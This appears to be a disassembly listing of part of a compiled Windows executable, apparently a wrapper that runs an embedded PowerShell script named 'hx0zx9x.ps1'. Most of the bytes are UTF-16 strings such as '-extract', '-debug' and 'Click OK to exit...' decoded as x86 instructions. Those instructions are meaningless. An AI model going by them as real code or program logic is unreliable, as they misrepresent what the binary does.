  408b22:	30 00                	xor    %al,(%eax)
  408b24:	30 00                	xor    %al,(%eax)
  408b26:	00 0f                	add    %cl,(%edi)
  408b28:	23 00                	and    (%eax),%eax
  408b2a:	43                   	inc    %ebx
  408b2b:	00 30                	add    %dh,(%eax)
  408b2d:	00 43 00             	add    %al,0x0(%ebx)
  408b30:	30 00                	xor    %al,(%eax)
  408b32:	43                   	inc    %ebx
  408b33:	00 30                	add    %dh,(%eax)
  408b35:	00 00                	add    %al,(%eax)
  408b37:	0f 23 00             	mov    %eax,%db0
  408b3a:	30 00                	xor    %al,(%eax)
  408b3c:	30 00                	xor    %al,(%eax)
  408b3e:	46                   	inc    %esi
  408b3f:	00 46 00             	add    %al,0x0(%esi)
  408b42:	30 00                	xor    %al,(%eax)
  408b44:	30 00                	xor    %al,(%eax)
  408b46:	00 21                	add    %ah,(%ecx)
  408b48:	52                   	push   %edx
  408b49:	00 65 00             	add    %ah,0x0(%ebp)
  408b4c:	6d                   	insl   (%dx),%es:(%edi)
  408b4d:	00 61 00             	add    %ah,0x0(%ecx)
  408b50:	69 00 6e 00 69 00    	imul   $0x69006e,(%eax),%eax
  408b56:	6e                   	outsb  %ds:(%esi),(%dx)
  408b57:	00 67 00             	add    %ah,0x0(%edi)
  408b5a:	20 00                	and    %al,(%eax)
  408b5c:	74 00                	je     0x408b5e
  408b5e:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  408b64:	3a 00                	cmp    (%eax),%al
  408b66:	20 00                	and    %al,(%eax)
  408b68:	00 29                	add    %ch,(%ecx)
  408b6a:	7b 00                	jnp    0x408b6c
  408b6c:	30 00                	xor    %al,(%eax)
  408b6e:	3a 00                	cmp    (%eax),%al
  408b70:	30 00                	xor    %al,(%eax)
  408b72:	30 00                	xor    %al,(%eax)
  408b74:	7d 00                	jge    0x408b76
  408b76:	3a 00                	cmp    (%eax),%al
  408b78:	7b 00                	jnp    0x408b7a
  408b7a:	31 00                	xor    %eax,(%eax)
  408b7c:	3a 00                	cmp    (%eax),%al
  408b7e:	30 00                	xor    %al,(%eax)
  408b80:	30 00                	xor    %al,(%eax)
  408b82:	7d 00                	jge    0x408b84
  408b84:	3a 00                	cmp    (%eax),%al
  408b86:	7b 00                	jnp    0x408b88
  408b88:	32 00                	xor    (%eax),%al
  408b8a:	3a 00                	cmp    (%eax),%al
  408b8c:	30 00                	xor    %al,(%eax)
  408b8e:	30 00                	xor    %al,(%eax)
  408b90:	7d 00                	jge    0x408b92
  408b92:	00 3f                	add    %bh,(%edi)
  408b94:	53                   	push   %ebx
  408b95:	00 79 00             	add    %bh,0x0(%ecx)
  408b98:	73 00                	jae    0x408b9a
  408b9a:	74 00                	je     0x408b9c
  408b9c:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  408ba0:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  408ba4:	6f                   	outsl  %ds:(%esi),(%dx)
  408ba5:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  408ba9:	00 65 00             	add    %ah,0x0(%ebp)
  408bac:	63 00                	arpl   %eax,(%eax)
  408bae:	74 00                	je     0x408bb0
  408bb0:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408bb6:	73 00                	jae    0x408bb8
  408bb8:	2e 00 47 00          	add    %al,%cs:0x0(%edi)
  408bbc:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  408bc0:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408bc4:	69 00 63 00 2e 00    	imul   $0x2e0063,(%eax),%eax
  408bca:	4c                   	dec    %esp
  408bcb:	00 69 00             	add    %ch,0x0(%ecx)
  408bce:	73 00                	jae    0x408bd0
  408bd0:	74 00                	je     0x408bd2
  408bd2:	00 03                	add    %al,(%ebx)
  408bd4:	31 00                	xor    %eax,(%eax)
  408bd6:	00 15 7b 00 30 00    	add    %dl,0x30007b
  408bdc:	7d 00                	jge    0x408bde
  408bde:	5b                   	pop    %ebx
  408bdf:	00 7b 00             	add    %bh,0x0(%ebx)
  408be2:	31 00                	xor    %eax,(%eax)
  408be4:	7d 00                	jge    0x408be6
  408be6:	5d                   	pop    %ebp
  408be7:	00 3a                	add    %bh,(%edx)
  408be9:	00 20                	add    %ah,(%eax)
  408beb:	00 00                	add    %al,(%eax)
  408bed:	07                   	pop    %es
  408bee:	41                   	inc    %ecx
  408bef:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  408bf3:	00 00                	add    %al,(%eax)
  408bf5:	0f 54 00             	andps  (%eax),%xmm0
  408bf8:	6f                   	outsl  %ds:(%esi),(%dx)
  408bf9:	00 41 00             	add    %al,0x0(%ecx)
  408bfc:	72 00                	jb     0x408bfe
  408bfe:	72 00                	jb     0x408c00
  408c00:	61                   	popa
  408c01:	00 79 00             	add    %bh,0x0(%ecx)
  408c04:	00 0b                	add    %cl,(%ebx)
  408c06:	7b 00                	jnp    0x408c08
  408c08:	30 00                	xor    %al,(%eax)
  408c0a:	7d 00                	jge    0x408c0c
  408c0c:	3a 00                	cmp    (%eax),%al
  408c0e:	20 00                	and    %al,(%eax)
  408c10:	00 29                	add    %ch,(%ecx)
  408c12:	0a 00                	or     (%eax),%al
  408c14:	28 00                	sub    %al,(%eax)
  408c16:	54                   	push   %esp
  408c17:	00 79 00             	add    %bh,0x0(%ecx)
  408c1a:	70 00                	jo     0x408c1c
  408c1c:	65 00 20             	add    %ah,%gs:(%eax)
  408c1f:	00 21                	add    %ah,(%ecx)
  408c21:	00 3f                	add    %bh,(%edi)
  408c23:	00 20                	add    %ah,(%eax)
  408c25:	00 66 00             	add    %ah,0x0(%esi)
  408c28:	6f                   	outsl  %ds:(%esi),(%dx)
  408c29:	00 72 00             	add    %dh,0x0(%edx)
  408c2c:	20 00                	and    %al,(%eax)
  408c2e:	68 00 65 00 6c       	push   $0x6c006500
  408c33:	00 70 00             	add    %dh,0x0(%eax)
  408c36:	2e 00 29             	add    %ch,%cs:(%ecx)
  408c39:	00 00                	add    %al,(%eax)
  408c3b:	05 21 00 3f 00       	add    $0x3f0021,%eax
  408c40:	00 47 57             	add    %al,0x57(%edi)
  408c43:	00 72 00             	add    %dh,0x0(%edx)
  408c46:	6f                   	outsl  %ds:(%esi),(%dx)
  408c47:	00 6e 00             	add    %ch,0x0(%esi)
  408c4a:	67 00 20             	add    %ah,(%bx,%si)
  408c4d:	00 66 00             	add    %ah,0x0(%esi)
  408c50:	6f                   	outsl  %ds:(%esi),(%dx)
  408c51:	00 72 00             	add    %dh,0x0(%edx)
  408c54:	6d                   	insl   (%dx),%es:(%edi)
  408c55:	00 61 00             	add    %ah,0x0(%ecx)
  408c58:	74 00                	je     0x408c5a
  408c5a:	2c 00                	sub    $0x0,%al
  408c5c:	20 00                	and    %al,(%eax)
  408c5e:	70 00                	jo     0x408c60
  408c60:	6c                   	insb   (%dx),%es:(%edi)
  408c61:	00 65 00             	add    %ah,0x0(%ebp)
  408c64:	61                   	popa
  408c65:	00 73 00             	add    %dh,0x0(%ebx)
  408c68:	65 00 20             	add    %ah,%gs:(%eax)
  408c6b:	00 72 00             	add    %dh,0x0(%edx)
  408c6e:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  408c72:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  408c76:	74 00                	je     0x408c78
  408c78:	20 00                	and    %al,(%eax)
  408c7a:	69 00 6e 00 70 00    	imul   $0x70006e,(%eax),%eax
  408c80:	75 00                	jne    0x408c82
  408c82:	74 00                	je     0x408c84
  408c84:	3a 00                	cmp    (%eax),%al
  408c86:	20 00                	and    %al,(%eax)
  408c88:	00 07                	add    %al,(%edi)
  408c8a:	08 00                	or     %al,(%eax)
  408c8c:	20 00                	and    %al,(%eax)
  408c8e:	08 00                	or     %al,(%eax)
  408c90:	01 03                	add    %eax,(%ebx)
  408c92:	2a 00                	sub    (%eax),%al
  408c94:	00 1f                	add    %bl,(%edi)
  408c96:	50                   	push   %eax
  408c97:	00 53 00             	add    %dl,0x0(%ebx)
  408c9a:	52                   	push   %edx
  408c9b:	00 75 00             	add    %dh,0x0(%ebp)
  408c9e:	6e                   	outsb  %ds:(%esi),(%dx)
  408c9f:	00 73 00             	add    %dh,0x0(%ebx)
  408ca2:	70 00                	jo     0x408ca4
  408ca4:	61                   	popa
  408ca5:	00 63 00             	add    %ah,0x0(%ebx)
  408ca8:	65 00 2d 00 48 00 6f 	add    %ch,%gs:0x6f004800
  408caf:	00 73 00             	add    %dh,0x0(%ebx)
  408cb2:	74 00                	je     0x408cb4
  408cb4:	01 05 75 00 69 00    	add    %eax,0x690075
  408cba:	00 0b                	add    %cl,(%ebx)
  408cbc:	2d 00 77 00 61       	sub    $0x61007700,%eax
  408cc1:	00 69 00             	add    %ch,0x0(%ecx)
  408cc4:	74 00                	je     0x408cc6
  408cc6:	01 11                	add    %edx,(%ecx)
  408cc8:	2d 00 65 00 78       	sub    $0x78006500,%eax
  408ccd:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  408cd1:	00 61 00             	add    %ah,0x0(%ecx)
  408cd4:	63 00                	arpl   %eax,(%eax)
  408cd6:	74 00                	je     0x408cd8
  408cd8:	01 03                	add    %eax,(%ebx)
  408cda:	3a 00                	cmp    (%eax),%al
  408cdc:	00 80 dd 49 00 66    	add    %al,0x660049dd(%eax)
  408ce2:	00 20                	add    %ah,(%eax)
  408ce4:	00 79 00             	add    %bh,0x0(%ecx)
  408ce7:	6f                   	outsl  %ds:(%esi),(%dx)
  408ce8:	00 75 00             	add    %dh,0x0(%ebp)
  408ceb:	20 00                	and    %al,(%eax)
  408ced:	73 00                	jae    0x408cef
  408cef:	70 00                	jo     0x408cf1
  408cf1:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  408cf5:	69 00 66 00 79 00    	imul   $0x790066,(%eax),%eax
  408cfb:	20 00                	and    %al,(%eax)
  408cfd:	74 00                	je     0x408cff
  408cff:	68 00 65 00 20       	push   $0x20006500
  408d04:	00 2d 00 65 00 78    	add    %ch,0x78006500
  408d0a:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  408d0e:	00 61 00             	add    %ah,0x0(%ecx)
  408d11:	63 00                	arpl   %eax,(%eax)
  408d13:	74 00                	je     0x408d15
  408d15:	20 00                	and    %al,(%eax)
  408d17:	6f                   	outsl  %ds:(%esi),(%dx)
  408d18:	00 70 00             	add    %dh,0x0(%eax)
  408d1b:	74 00                	je     0x408d1d
  408d1d:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408d23:	20 00                	and    %al,(%eax)
  408d25:	79 00                	jns    0x408d27
  408d27:	6f                   	outsl  %ds:(%esi),(%dx)
  408d28:	00 75 00             	add    %dh,0x0(%ebp)
  408d2b:	20 00                	and    %al,(%eax)
  408d2d:	6e                   	outsb  %ds:(%esi),(%dx)
  408d2e:	00 65 00             	add    %ah,0x0(%ebp)
  408d31:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  408d36:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  408d3a:	00 20                	add    %ah,(%eax)
  408d3c:	00 61 00             	add    %ah,0x0(%ecx)
  408d3f:	64 00 64 00 20       	add    %ah,%fs:0x20(%eax,%eax,1)
  408d44:	00 61 00             	add    %ah,0x0(%ecx)
  408d47:	20 00                	and    %al,(%eax)
  408d49:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  408d4d:	6c                   	insb   (%dx),%es:(%edi)
  408d4e:	00 65 00             	add    %ah,0x0(%ebp)
  408d51:	20 00                	and    %al,(%eax)
  408d53:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  408d57:	72 00                	jb     0x408d59
  408d59:	20 00                	and    %al,(%eax)
  408d5b:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  408d5f:	74 00                	je     0x408d61
  408d61:	72 00                	jb     0x408d63
  408d63:	61                   	popa
  408d64:	00 63 00             	add    %ah,0x0(%ebx)
  408d67:	74 00                	je     0x408d69
  408d69:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408d6f:	20 00                	and    %al,(%eax)
  408d71:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  408d77:	74 00                	je     0x408d79
  408d79:	68 00 69 00 73       	push   $0x73006900
  408d7e:	00 20                	add    %ah,(%eax)
  408d80:	00 77 00             	add    %dh,0x0(%edi)
  408d83:	61                   	popa
  408d84:	00 79 00             	add    %bh,0x0(%ecx)
  408d87:	0d 00 0a 00 20       	or     $0x20000a00,%eax
  408d8c:	00 20                	add    %ah,(%eax)
  408d8e:	00 20                	add    %ah,(%eax)
  408d90:	00 2d 00 65 00 78    	add    %ch,0x78006500
  408d96:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  408d9a:	00 61 00             	add    %ah,0x0(%ecx)
  408d9d:	63 00                	arpl   %eax,(%eax)
  408d9f:	74 00                	je     0x408da1
  408da1:	3a 00                	cmp    (%eax),%al
  408da3:	22 00                	and    (%eax),%al
  408da5:	3c 00                	cmp    $0x0,%al
  408da7:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  408dab:	6c                   	insb   (%dx),%es:(%edi)
  408dac:	00 65 00             	add    %ah,0x0(%ebp)
  408daf:	6e                   	outsb  %ds:(%esi),(%dx)
  408db0:	00 61 00             	add    %ah,0x0(%ecx)
  408db3:	6d                   	insl   (%dx),%es:(%edi)
  408db4:	00 65 00             	add    %ah,0x0(%ebp)
  408db7:	3e 00 22             	add    %ah,%ds:(%edx)
  408dba:	00 01                	add    %al,(%ecx)
  408dbc:	09 2d 00 65 00 6e    	or     %ebp,0x6e006500
  408dc2:	00 64 00 01          	add    %ah,0x1(%eax,%eax,1)
  408dc6:	0d 2d 00 64 00       	or     $0x64002d,%eax
  408dcb:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  408dcf:	75 00                	jne    0x408dd1
  408dd1:	67 00 01             	add    %al,(%bx,%di)
  408dd4:	17                   	pop    %ss
  408dd5:	68 00 78 00 30       	push   $0x30007800
  408dda:	00 7a 00             	add    %bh,0x0(%edx)
  408ddd:	78 00                	js     0x408ddf
  408ddf:	39 00                	cmp    %eax,(%eax)
  408de1:	78 00                	js     0x408de3
  408de3:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  408de7:	73 00                	jae    0x408de9
  408de9:	31 00                	xor    %eax,(%eax)
  408deb:	00 2f                	add    %ch,(%edi)
  408ded:	5e                   	pop    %esi
  408dee:	00 2d 00 28 00 5b    	add    %ch,0x5b002800
  408df4:	00 5e 00             	add    %bl,0x0(%esi)
  408df7:	3a 00                	cmp    (%eax),%al
  408df9:	20 00                	and    %al,(%eax)
  408dfb:	5d                   	pop    %ebp
  408dfc:	00 2b                	add    %ch,(%ebx)
  408dfe:	00 29                	add    %ch,(%ecx)
  408e00:	00 5b 00             	add    %bl,0x0(%ebx)
  408e03:	20 00                	and    %al,(%eax)
  408e05:	3a 00                	cmp    (%eax),%al
  408e07:	5d                   	pop    %ebp
  408e08:	00 3f                	add    %bh,(%edi)
  408e0a:	00 28                	add    %ch,(%eax)
  408e0c:	00 5b 00             	add    %bl,0x0(%ebx)
  408e0f:	5e                   	pop    %esi
  408e10:	00 3a                	add    %bh,(%edx)
  408e12:	00 5d 00             	add    %bl,0x0(%ebp)
  408e15:	2a 00                	sub    (%eax),%al
  408e17:	29 00                	sub    %eax,(%eax)
  408e19:	24 00                	and    $0x0,%al
  408e1b:	01 09                	add    %ecx,(%ecx)
  408e1d:	54                   	push   %esp
  408e1e:	00 72 00             	add    %dh,0x0(%edx)
  408e21:	75 00                	jne    0x408e23
  408e23:	65 00 00             	add    %al,%gs:(%eax)
  408e26:	0b 24 00             	or     (%eax,%eax,1),%esp
  408e29:	54                   	push   %esp
  408e2a:	00 52 00             	add    %dl,0x0(%edx)
  408e2d:	55                   	push   %ebp
  408e2e:	00 45 00             	add    %al,0x0(%ebp)
  408e31:	00 0b                	add    %cl,(%ebx)
  408e33:	46                   	inc    %esi
  408e34:	00 61 00             	add    %ah,0x0(%ecx)
  408e37:	6c                   	insb   (%dx),%es:(%edi)
  408e38:	00 73 00             	add    %dh,0x0(%ebx)
  408e3b:	65 00 00             	add    %al,%gs:(%eax)
  408e3e:	0d 24 00 46 00       	or     $0x460024,%eax
  408e43:	41                   	inc    %ecx
  408e44:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  408e48:	00 45 00             	add    %al,0x0(%ebp)
  408e4b:	00 15 4f 00 75 00    	add    %dl,0x75004f
  408e51:	74 00                	je     0x408e53
  408e53:	2d 00 53 00 74       	sub    $0x74005300,%eax
  408e58:	00 72 00             	add    %dh,0x0(%edx)
  408e5b:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  408e61:	01 0d 53 00 74 00    	add    %ecx,0x740053
  408e67:	72 00                	jb     0x408e69
  408e69:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  408e6d:	6d                   	insl   (%dx),%es:(%edi)
  408e6e:	00 00                	add    %al,(%eax)
  408e70:	27                   	daa
  408e71:	43                   	inc    %ebx
  408e72:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  408e76:	00 63 00             	add    %ah,0x0(%ebx)
  408e79:	6b 00 20             	imul   $0x20,(%eax),%eax
  408e7c:	00 4f 00             	add    %cl,0x0(%edi)
  408e7f:	4b                   	dec    %ebx
  408e80:	00 20                	add    %ah,(%eax)
  408e82:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  408e86:	00 20                	add    %ah,(%eax)
  408e88:	00 65 00             	add    %ah,0x0(%ebp)
  408e8b:	78 00                	js     0x408e8d
  408e8d:	69 00 74 00 2e 00    	imul   $0x2e0074,(%eax),%eax
  408e93:	2e 00 2e             	add    %ch,%cs:(%esi)
  408e96:	00 00                	add    %al,(%eax)
  408e98:	2f                   	das
  408e99:	55                   	push   %ebp
  408e9a:	00 6e 00             	add    %ch,0x0(%esi)
  408e9d:	68 00 61 00 6e       	push   $0x6e006100
  408ea2:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  408ea6:	00 65 00             	add    %ah,0x0(%ebp)
  408ea9:	64 00 20             	add    %ah,%fs:(%eax)
  408eac:	00 65 00             	add    %ah,0x0(%ebp)
  408eaf:	78 00                	js     0x408eb1
  408eb1:	63 00                	arpl   %eax,(%eax)
  408eb3:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  408eb7:	74 00                	je     0x408eb9
  408eb9:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408ebf:	20 00                	and    %al,(%eax)
  408ec1:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  408ec7:	00 4a 19             	add    %cl,0x19(%edx)
  408eca:	be 30 7c 83 e9       	mov    $0xe9837c30,%esi
  408ecf:	4b                   	dec    %ebx
  408ed0:	ba e6 dc de f1       	mov    $0xf1dedce6,%edx
  408ed5:	dc 41 c7             	faddl  -0x39(%ecx)
  408ed8:	00 08                	add    %cl,(%eax)
  408eda:	b7 7a                	mov    $0x7a,%bh
  408edc:	5c                   	pop    %esp
  408edd:	56                   	push   %esi
  408ede:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  408ee1:	89 08                	mov    %ecx,(%eax)
  408ee3:	31 bf 38 56 ad 36    	xor    %edi,0x36ad5638(%edi)
  408ee9:	4e                   	dec    %esi
  408eea:	35 14 00 0a 11       	xor    $0x110a0014,%eax
  408eef:	14 10                	adc    $0x10,%al
  408ef1:	11 0c 0e             	adc    %ecx,(%esi,%ecx,1)
  408ef4:	18 08                	sbb    %cl,(%eax)
  408ef6:	12 21                	adc    (%ecx),%ah
  408ef8:	08 12                	or     %dl,(%edx)
  408efa:	21 08                	and    %ecx,(%eax)
  408efc:	10 02                	adc    %al,(%edx)
  408efe:	11 10                	adc    %edx,(%eax)
  408f00:	0c 00                	or     $0x0,%al
  408f02:	06                   	push   %es
  408f03:	12 18                	adc    (%eax),%bl
  408f05:	0e                   	push   %cs
  408f06:	0e                   	push   %cs
  408f07:	0e                   	push   %cs
  408f08:	0e                   	push   %cs
  408f09:	11 25 11 29 03 20    	adc    %esp,0x20032911
  408f0f:	00 01                	add    %al,(%ecx)
  408f11:	02 06                	add    (%esi),%al
  408f13:	08 02                	or     %al,(%edx)
  408f15:	06                   	push   %es
  408f16:	18 02                	sbb    %al,(%edx)
  408f18:	06                   	push   %es
  408f19:	0e                   	push   %cs
  408f1a:	03 06                	add    (%esi),%eax
  408f1c:	11 10                	adc    %edx,(%eax)
  408f1e:	04 01                	add    $0x1,%al
  408f20:	00 00                	add    %al,(%eax)
  408f22:	00 04 02             	add    %al,(%edx,%eax,1)
  408f25:	00 00                	add    %al,(%eax)
  408f27:	00 04 04             	add    %al,(%esp,%eax,1)
  408f2a:	00 00                	add    %al,(%eax)
  408f2c:	00 04 08             	add    %al,(%eax,%ecx,1)
  408f2f:	00 00                	add    %al,(%eax)
  408f31:	00 04 10             	add    %al,(%eax,%edx,1)
  408f34:	00 00                	add    %al,(%eax)
  408f36:	00 04 40             	add    %al,(%eax,%eax,2)
  408f39:	00 00                	add    %al,(%eax)
  408f3b:	00 04 80             	add    %al,(%eax,%eax,4)
  408f3e:	00 00                	add    %al,(%eax)
  408f40:	00 04 00             	add    %al,(%eax,%eax,1)
  408f43:	01 00                	add    %eax,(%eax)
  408f45:	00 04 00             	add    %al,(%eax,%eax,1)
  408f48:	02 00                	add    (%eax),%al
  408f4a:	00 04 00             	add    %al,(%eax,%eax,1)
  408f4d:	04 00                	add    $0x0,%al
  408f4f:	00 04 00             	add    %al,(%eax,%eax,1)
  408f52:	08 00                	or     %al,(%eax)
  408f54:	00 04 00             	add    %al,(%eax,%eax,1)
  408f57:	10 00                	adc    %al,(%eax)
  408f59:	00 04 00             	add    %al,(%eax,%eax,1)
  408f5c:	40                   	inc    %eax
  408f5d:	00 00                	add    %al,(%eax)
  408f5f:	04 00                	add    $0x0,%al
  408f61:	00 02                	add    %al,(%edx)
  408f63:	00 04 00             	add    %al,(%eax,%eax,1)
  408f66:	00 04 00             	add    %al,(%eax,%eax,1)
  408f69:	04 00                	add    $0x0,%al
  408f6b:	00 08                	add    %cl,(%eax)
  408f6d:	00 04 00             	add    %al,(%eax,%eax,1)
  408f70:	00 10                	add    %dl,(%eax)
  408f72:	00 03                	add    %al,(%ebx)
  408f74:	06                   	push   %es
  408f75:	11 14 04             	adc    %edx,(%esp,%eax,1)
  408f78:	00 00                	add    %al,(%eax)
  408f7a:	00 00                	add    %al,(%eax)
  408f7c:	04 c7                	add    $0xc7,%al
  408f7e:	04 00                	add    $0x0,%al
  408f80:	00 04 20             	add    %al,(%eax,%eiz,1)
  408f83:	05 00 00 04 90       	add    $0x90040000,%eax
  408f88:	04 00                	add    $0x0,%al
  408f8a:	00 04 23             	add    %al,(%ebx,%eiz,1)
  408f8d:	05 00 00 04 7a       	add    $0x7a040000,%eax
  408f92:	00 00                	add    %al,(%eax)
  408f94:	00 04 57             	add    %al,(%edi,%edx,2)
  408f97:	00 00                	add    %al,(%eax)
  408f99:	00 04 ec             	add    %al,(%esp,%ebp,8)
  408f9c:	03 00                	add    (%eax),%eax
  408f9e:	00 03                	add    %al,(%ebx)
  408fa0:	06                   	push   %es
  408fa1:	11 2d 04 20 00 11    	adc    %ebp,0x11002004
  408fa7:	2d 05 20 01 01       	sub    $0x1012005,%eax
  408fac:	11 2d 04 20 00 11    	adc    %ebp,0x11002004
  408fb2:	31 05 20 01 01 11    	xor    %eax,0x11010120
  408fb8:	31 04 20             	xor    %eax,(%eax,%eiz,1)
  408fbb:	00 11                	add    %dl,(%ecx)
  408fbd:	35 05 20 01 01       	xor    $0x1012005,%eax
  408fc2:	11 35 03 20 00 08    	adc    %esi,0x8002003
  408fc8:	04 20                	add    $0x20,%al
  408fca:	01 01                	add    %eax,(%ecx)
  408fcc:	08 03                	or     %al,(%ebx)
  408fce:	06                   	push   %es
  408fcf:	12 15 0c 20 01 14    	adc    0x1401200c,%dl
  408fd5:	11 39                	adc    %edi,(%ecx)
  408fd7:	02 00                	add    (%eax),%al
  408fd9:	02 00                	add    (%eax),%al
  408fdb:	00 11                	add    %dl,(%ecx)
  408fdd:	3d 03 20 00 02       	cmp    $0x2002003,%eax
  408fe2:	06                   	push   %es
  408fe3:	20 01                	and    %al,(%ecx)
  408fe5:	11 41 11             	adc    %eax,0x11(%ecx)
  408fe8:	45                   	inc    %ebp
  408fe9:	0b 20                	or     (%eax),%esp
  408feb:	04 01                	add    $0x1,%al
  408fed:	11 3d 11 35 11 3d    	adc    %edi,0x3d113511
  408ff3:	11 39                	adc    %edi,(%ecx)
  408ff5:	07                   	pop    %es
  408ff6:	20 02                	and    %al,(%edx)
  408ff8:	01 11                	add    %edx,(%ecx)
  408ffa:	3d 11 39 0d 20       	cmp    $0x200d3911,%eax
  408fff:	02 01                	add    (%ecx),%al
  409001:	11 35 14 11 39 02    	adc    %esi,0x2391114
  409007:	00 02                	add    %al,(%edx)
  409009:	00 00                	add    %al,(%eax)
  40900b:	03 20                	add    (%eax),%esp
  40900d:	00 0e                	add    %cl,(%esi)
  40900f:	04 20                	add    $0x20,%al
  409011:	01 01                	add    %eax,(%ecx)
  409013:	0e                   	push   %cs
  409014:	04 28                	add    $0x28,%al
  409016:	00 11                	add    %dl,(%ecx)
  409018:	2d 04 28 00 11       	sub    $0x11002804,%eax
  40901d:	31 04 28             	xor    %eax,(%eax,%ebp,1)
  409020:	00 11                	add    %dl,(%ecx)
  409022:	35 03 28 00 08       	xor    $0x8002803,%eax
  409027:	03 28                	add    (%eax),%ebp
  409029:	00 02                	add    %al,(%edx)
  40902b:	03 28                	add    (%eax),%ebp
  40902d:	00 0e                	add    %cl,(%esi)
  40902f:	04 00                	add    $0x0,%al
  409031:	01 18                	add    %ebx,(%eax)
  409033:	09 09                	or     %ecx,(%ecx)
  409035:	00 04 11             	add    %al,(%ecx,%edx,1)
  409038:	49                   	dec    %ecx
  409039:	0e                   	push   %cs
  40903a:	0e                   	push   %cs
  40903b:	10 0e                	adc    %cl,(%esi)
  40903d:	02 08                	add    (%eax),%cl
  40903f:	00 03                	add    %al,(%ebx)
  409041:	11 49 0e             	adc    %ecx,0xe(%ecx)
  409044:	0e                   	push   %cs
  409045:	10 0e                	adc    %cl,(%esi)
  409047:	0c 00                	or     $0x0,%al
  409049:	04 08                	add    $0x8,%al
  40904b:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  409050:	51                   	push   %ecx
  409051:	08 0e                	or     %cl,(%esi)
  409053:	0e                   	push   %cs
  409054:	0b 00                	or     (%eax),%eax
  409056:	06                   	push   %es
  409057:	08 09                	or     %cl,(%ecx)
  409059:	09 1d 05 12 21 08    	or     %ebx,0x8211205
  40905f:	09 07                	or     %eax,(%edi)
  409061:	00 03                	add    %al,(%ebx)
  409063:	0e                   	push   %cs
  409064:	11 55 02             	adc    %edx,0x2(%ebp)
  409067:	02 07                	add    (%edi),%al
  409069:	00 03                	add    %al,(%ebx)
  40906b:	11 41 0e             	adc    %eax,0xe(%ecx)
  40906e:	0e                   	push   %cs
  40906f:	02 02                	add    (%edx),%al
  409071:	06                   	push   %es
  409072:	02 03                	add    (%ebx),%al
  409074:	06                   	push   %es
  409075:	11 41 06             	adc    %eax,0x6(%ecx)
  409078:	20 02                	and    %al,(%edx)
  40907a:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40907d:	59                   	pop    %ecx
  40907e:	03 06                	add    (%esi),%eax
  409080:	12 5d 07             	adc    0x7(%ebp),%bl
  409083:	06                   	push   %es
  409084:	15 12 61 01 11       	adc    $0x11016112,%eax
  409089:	34 08                	xor    $0x8,%al
  40908b:	b0 3f                	mov    $0x3f,%al
  40908d:	5f                   	pop    %edi
  40908e:	7f 11                	jg     0x4090a1
  409090:	d5 0a                	aad    $0xa
  409092:	3a 06                	cmp    (%esi),%al
  409094:	20 01                	and    %al,(%ecx)
  409096:	11 65 11             	adc    %esp,0x11(%ebp)
  409099:	2d 06 20 02 01       	sub    $0x1022006,%eax
  40909e:	1c 12                	sbb    $0x12,%al
  4090a0:	69 07 20 02 01 10    	imul   $0x10010220,(%edi),%eax
  4090a6:	11 34 08             	adc    %esi,(%eax,%ecx,1)
  4090a9:	05 20 01 01 12       	add    $0x12010120,%eax
  4090ae:	6d                   	insl   (%dx),%es:(%edi)
  4090af:	03 06                	add    (%esi),%eax
  4090b1:	12 71 03             	adc    0x3(%ecx),%dh
  4090b4:	06                   	push   %es
  4090b5:	12 75 05             	adc    0x5(%ebp),%dh
  4090b8:	00 01                	add    %al,(%ecx)
  4090ba:	19 11                	sbb    %edx,(%ecx)
  4090bc:	40                   	inc    %eax
  4090bd:	05 00 01 11 3c       	add    $0x3c110100,%eax
  4090c2:	19 03                	sbb    %eax,(%ebx)
  4090c4:	00 00                	add    %al,(%eax)
  4090c6:	02 02                	add    (%edx),%al
  4090c8:	06                   	push   %es
  4090c9:	09 03                	or     %eax,(%ebx)
  4090cb:	06                   	push   %es
  4090cc:	11 3c 04             	adc    %edi,(%esp,%eax,1)
  4090cf:	03 00                	add    (%eax),%eax
  4090d1:	00 00                	add    %al,(%eax)
  4090d3:	04 00                	add    $0x0,%al
  4090d5:	80 00 00             	addb   $0x0,(%eax)
  4090d8:	03 06                	add    (%esi),%eax
  4090da:	11 40 04             	adc    %eax,0x4(%eax)
  4090dd:	f6 ff                	idiv   %bh
  4090df:	ff                   	(bad)
  4090e0:	ff 04 f5 ff ff ff 04 	incl   0x4ffffff(,%esi,8)
  4090e7:	f4                   	hlt
  4090e8:	ff                   	(bad)
  4090e9:	ff                   	(bad)
